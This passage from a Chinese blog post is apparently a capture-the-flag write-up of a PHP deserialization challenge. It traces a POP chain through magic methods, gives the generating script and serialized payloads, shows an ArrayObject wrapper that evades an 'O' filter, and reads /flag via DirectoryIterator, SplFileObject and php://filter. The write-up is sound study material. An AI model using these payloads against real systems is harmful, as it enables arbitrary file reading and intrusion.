+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot;%00Modifier%00var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716538.png" alt="image-20241130193449104"></p>
+<p>做完这道题之后,来感觉了,感觉可以对三面题下手了</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p><del><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716575.png" alt="image-20241127213019640"></del></p>
+<p><del>一行一行看函数,学函数吧</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$D0g3 = $_POST[&#x27;D0g3&#x27;]; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><del>最开始这段简单就是在网页上显示代码,且不显示错误提示</del></p>
+<p><del>POST传入一个参数D0g3</del></p>
+<p>首先分析类A</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">    private $a1;</span><br><span class="line">    private $a2;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;a1;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unset($arg1)&#123;</span><br><span class="line">        echo $this-&gt;a2-&gt;a2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><del>首先定义了两个private的属性a1和a2</del></p>
+<p><del>然后是一个魔术方法__wakeup(),在被反序列化时自动触发,输出$this-&gt;a1</del></p>
+<p><del>$this代表当前对象实例.在类的方法中,$this用于引用调用该方法的对象</del></p>
+<p><del>$this-&gt;a1 就是会返回a1的值,如果a1没被赋值或者是null,则会返回空字符串</del></p>
+<p><del>然后是另一个魔术方法__unset(),在不可访问的属性上使用unset()时触发</del></p>
+<p><del>$arg1是被unset的属性名,但是这串代码里好像没定义这个,没啥用?</del></p>
+<p><del>然后输出$this-&gt;a2-&gt;a2,要求 $this-&gt;a2 是一个对象，并且这个对象必须有属性 a2</del></p>
+<h3 id="上面的都是之前写的-那时候一点反序列化不会-现在一看思路都是错的-不能从上往下直接这么看"><a href="#上面的都是之前写的-那时候一点反序列化不会-现在一看思路都是错的-不能从上往下直接这么看" class="headerlink" title="上面的都是之前写的,那时候一点反序列化不会,现在一看思路都是错的,不能从上往下直接这么看"></a>上面的都是之前写的,那时候一点反序列化不会,现在一看思路都是错的,不能从上往下直接这么看</h3><p>应该反着推才对</p>
+<p>目标是<code>echo new $_GET[&#39;a&#39;]($_GET[&#39;b&#39;]);</code></p>
+<p>需要调用flag()方法</p>
+<p>发现只有B类中的__get()方法中调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;b2-&gt;flag()</span><br></pre></td></tr></table></figure>
+
+<p>所以这个$b2就应该是C类</p>
+<p>__get()的触发时机是调用的成员属性不存在或不可访问</p>
+<p>正好$arg1不存在</p>
+<p>所以在A类中的<code>__unset($arg1)触发__get()</code></p>
+<p>所以$a2是B类</p>
+<p>再找触发__unset()方法的</p>
+<p><code>__unset()的触发时机是对不可访问属性使用unset()时</code></p>
+<p>C类的__invoke()方法下正好有unset($this-&gt;c1-&gt;c1)</p>
+<p>所以$c1就应该是A类</p>
+<p>再找触发__invoke()方法的</p>
+<p>__invoke()方法的触发时机:把对象当成函数调用</p>
+<p>发现只有B类<code>__toString()</code> 方法中的 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b3 = $this-&gt;b1;</span><br><span class="line">return $b3();</span><br></pre></td></tr></table></figure>
+
+<p>把b1当作函数调用了,所以$b1就应该是C类</p>
+<p>再找触发__tostring方法的</p>
+<p>__tostring方法的触发时机是把对象当成<strong>字符串</strong>调用</p>
+<p>类A<code>__wakeup()</code>方法下echo $this-&gt;a1 可以触发__tostring()</p>
+<p>所以$a1是B类</p>
+<p>__wakeup()在反序列化时就会触发,到此为止成功实现闭环.</p>
+<p>链子构建完了</p>
+<p>搞payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$D0g3 = $_POST[&#x27;D0g3&#x27;];</span><br><span class="line">class A&#123;</span><br><span class="line">    public $a1;</span><br><span class="line">    public $a2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b1;</span><br><span class="line">    public $b2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$c = new C();</span><br><span class="line">$a -&gt;a1 = $b;</span><br><span class="line">$a -&gt;a2 = $b;</span><br><span class="line">$b -&gt;b1 = $c;</span><br><span class="line">$b -&gt;b2 = $c;</span><br><span class="line">$c -&gt;c1 = $a;</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716800.png" alt="image-20241203224236778"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:2:&#123;s:2:&quot;b1&quot;;O:1:&quot;C&quot;:1:&#123;s:2:&quot;c1&quot;;O:1:&quot;A&quot;:2:&#123;s:2:&quot;a1&quot;;r:1;s:2:&quot;a2&quot;;r:1;&#125;&#125;s:2:&quot;b2&quot;;r:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把属性全改成public之后本地尝试一下</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716815.png" alt="image-20241204001905384"></p>
+<p>发现可以执行flag()</p>
+<p>要注意这些属性都是私有属性,需要加(空字符)类名(空字符)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:2:&#123;s:5:&quot;%00B%00b1&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;%00C%00c1&quot;;O:1:&quot;A&quot;:2:&#123;s:5:&quot;%00A%00a1&quot;;r:1;s:5:&quot;%00A%00a2&quot;;r:1;&#125;&#125;s:5:&quot;%00B%00b2&quot;;r:2;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717192.png" alt="image-20241204002406087"></p>
+<p>也成功了</p>
+<p>现在就需要把这个bypass掉</p>
+<p>但是题目中把O过滤了提示要用C</p>
+<h3 id="内置方法绕过"><a href="#内置方法绕过" class="headerlink" title="内置方法绕过"></a><strong>内置方法绕过</strong></h3><p>  当使用C代替O来标识对象类型时，反序列化将创建一个新的类而不是对象，因为新的类没有被序列化过，所以它没有任何属性或方法，<code>__wakeup魔术方法和__destruct</code>也就不会自动调用。但是，这种方法的缺点是，如果在原先的利用链中需要使用类的属性这个方法就行不通了。</p>
+<p>尝试使用ArrayObject内置类对象绕过</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717246.png" alt="image-20241204010641187"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:11:&quot;ArrayObject&quot;:125:&#123;x:i:0;a:1:&#123;s:4:&quot;test&quot;;O:1:&quot;B&quot;:2:&#123;s:2:&quot;b1&quot;;O:1:&quot;C&quot;:1:&#123;s:2:&quot;c1&quot;;O:1:&quot;A&quot;:2:&#123;s:2:&quot;a1&quot;;r:4;s:2:&quot;a2&quot;;r:4;&#125;&#125;s:2:&quot;b2&quot;;r:5;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再把字符数改一下,私有属性改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:11:&quot;ArrayObject&quot;:140:&#123;x:i:0;a:1:&#123;s:4:&quot;test&quot;;O:1:&quot;B&quot;:2:&#123;s:5:&quot;%00B%00b1&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;%00C%00c1&quot;;O:1:&quot;A&quot;:2:&#123;s:5:&quot;%00A%00a1&quot;;r:4;s:5:&quot;%00A%00a2&quot;;r:4;&#125;&#125;s:5:&quot;%00B%00b2&quot;;r:5;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功!!!!!!!!!!!!!!!!!!!!!!!!!</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717379.png" alt="image-20241204011256827"></p>
+<h3 id="提示1-反序列化更新提示：想想php原生类怎么利用"><a href="#提示1-反序列化更新提示：想想php原生类怎么利用" class="headerlink" title="提示1:反序列化更新提示：想想php原生类怎么利用"></a>提示1:反序列化更新提示：想想php原生类怎么利用</h3><p>PHP原生类</p>
+<ul>
+<li>Error</li>
+<li>Exception</li>
+<li>SoapClient</li>
+<li>DirectoryIterator</li>
+<li>SimpleXMLElement</li>
+</ul>
+<h3 id="Error-内置类"><a href="#Error-内置类" class="headerlink" title="Error 内置类"></a>Error 内置类</h3><ul>
+<li>适用于php7版本</li>
+<li>在开启报错的情况下</li>
+</ul>
+<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p>
+<h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><ul>
+<li>适用于php5、7版本</li>
+<li>开启报错的情况下</li>
+</ul>
+<p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
+<p><strong>类属性：</strong></p>
+<ul>
+<li>message：异常消息内容</li>
+<li>code：异常代码</li>
+<li>file：抛出异常的文件名</li>
+<li>line：抛出异常在该文件中的行号</li>
+</ul>
+<p><strong>类方法：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
+</ul>
+<p>我们可以看到，在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
+<h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>观察发现没有报错</p>
+<p>于是不能使用Error 内置类和Exception 内置类</p>
+<h3 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h3><p><strong>遍历⽬录类</strong></p>
+<p> DirectoryIterator</p>
+<p> GlobIterator</p>
+<p> FilesystemIterator</p>
+<p><strong>读取⽂件类</strong></p>
+<p> SplFileObject</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717368.png" alt="X8{OLPI664TTMK2QY@{PP65"></p>
+<p>使用<code>?a=DirectoryIterator&amp;b=glob:///*/*/*/*/fla*</code></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717797.png" alt="image-20241204012444960"></p>
+<p>找到了一个flags</p>
+<p>不知道为什么会有这个flags,其实flag在&#x2F;flag</p>
+<p>然后⽤SplFileObject去读⽂件</p>
+<p>?a&#x3D;SplFileObject&amp;b&#x3D;&#x2F;flag</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717724.png" alt="image-20241204020737249"></p>
+<p>因为SplFileObject只能读取一行内容,所以需要使⽤伪协议将其读出来</p>
+<p><code>?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=/flag</code></p>
+<p>成功读出flag</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212717985.png" alt="image-20241204013850858"></p>
+<p>最后base64解码</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212718209.png" alt="image-20241204014715859"></p>
+<p>得到flag</p>
+<p>D0g3{UNs3r14L123_1s_funNYy}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/" title="php反序列化进阶"><img class="cover" src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">php反序列化进阶</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/pearcmd/" title="pearcmd"><img class="cover" src="/img/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">pearcmd</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPHP%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">什么是PHP序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">什么是反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">php反序列化漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">php面向对象基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.1.1.</span> <span class="toc-text">面向过程和面向对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">3.1.2.</span> <span class="toc-text">类的定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-number">4.</span> <span class="toc-text">类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">4.1.</span> <span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC"><span class="toc-number">4.2.</span> <span class="toc-text">实例化和赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.3.</span> <span class="toc-text">类的修饰符介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">4.3.1.</span> <span class="toc-text">常用访问权限修饰符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#public"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">public</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#protected"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">protected</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#private"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">private</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1-1"><span class="toc-number">4.4.</span> <span class="toc-text">类与对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-number">4.5.</span> <span class="toc-text">类的成员方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">序列化的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F"><span class="toc-number">5.1.</span> <span class="toc-text">表达方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.1.1.</span> <span class="toc-text">数组序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.1.2.</span> <span class="toc-text">对象序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#private%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6"><span class="toc-number">5.1.3.</span> <span class="toc-text">private私有属性序列化时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#protected%E5%8F%97%E4%BF%9D%E6%8A%A4%E5%B1%9E%E6%80%A7%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6"><span class="toc-number">5.1.4.</span> <span class="toc-text">protected受保护属性序列化时</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-1"><span class="toc-number">7.1.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">7.2.</span> <span class="toc-text">__construct()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">7.2.1.</span> <span class="toc-text">__destruct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">7.2.2.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">7.2.3.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">7.2.4.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-number">7.2.5.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-number">7.2.6.</span> <span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#callStatic"><span class="toc-number">7.2.7.</span> <span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get"><span class="toc-number">7.2.8.</span> <span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set"><span class="toc-number">7.2.9.</span> <span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isset"><span class="toc-number">7.2.10.</span> <span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unset"><span class="toc-number">7.2.11.</span> <span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clone"><span class="toc-number">7.2.12.</span> <span class="toc-text">__clone()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%E5%89%8D%E7%BD%AE"><span class="toc-number">8.</span> <span class="toc-text">POP链前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E7%9A%84%E5%89%8D%E6%8F%90"><span class="toc-number">8.1.</span> <span class="toc-text">魔术方法调用的前提:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number">9.</span> <span class="toc-text">POP链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">10.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E9%83%BD%E6%98%AF%E4%B9%8B%E5%89%8D%E5%86%99%E7%9A%84-%E9%82%A3%E6%97%B6%E5%80%99%E4%B8%80%E7%82%B9%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E4%BC%9A-%E7%8E%B0%E5%9C%A8%E4%B8%80%E7%9C%8B%E6%80%9D%E8%B7%AF%E9%83%BD%E6%98%AF%E9%94%99%E7%9A%84-%E4%B8%8D%E8%83%BD%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E7%9B%B4%E6%8E%A5%E8%BF%99%E4%B9%88%E7%9C%8B"><span class="toc-number">10.1.</span> <span class="toc-text">上面的都是之前写的,那时候一点反序列化不会,现在一看思路都是错的,不能从上往下直接这么看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">10.2.</span> <span class="toc-text">内置方法绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9B%B4%E6%96%B0%E6%8F%90%E7%A4%BA%EF%BC%9A%E6%83%B3%E6%83%B3php%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">10.3.</span> <span class="toc-text">提示1:反序列化更新提示：想想php原生类怎么利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">10.4.</span> <span class="toc-text">Error 内置类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">10.5.</span> <span class="toc-text">Exception 内置类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 